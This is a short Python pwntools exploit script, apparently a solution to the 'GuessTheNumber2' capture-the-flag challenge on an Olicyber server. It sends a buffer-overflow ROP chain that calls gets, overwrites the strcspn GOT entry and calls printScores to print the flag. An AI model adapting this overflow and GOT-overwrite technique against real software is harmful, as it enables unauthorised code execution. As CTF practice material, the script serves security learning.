#!/usr/bin/env python3
from pwn import *

elf = ELF('./GuessTheNumber2')
if args.REMOTE:
    r = remote("gtn2.challs.olicyber.it", 10023)
else:
    r = gdb.debug(elf.path, '''
        continue
    ''')

FLAG = 0x404098
PAYLOAD = b'\0' * (28) + p64(0x401803) + (p64(0x401803) + p64(0x404098) + p64(elf.sym['gets'])) * 2 + \
    p64(0x401803) + p64(elf.got['strcspn']) + p64(elf.sym['gets']) + p64(0x401803) + p64(0x404098) + p64(elf.sym['printScores'])

r.recvuntil(b':\n')
r.sendline(PAYLOAD)
r.recvuntil(b'Secondary file\n')
r.sendline(b'1')
r.recvuntil(b'No high scores yet :(\n')

r.sendline(b'flag')
r.sendline(p64(0x401150))

r.interactive()
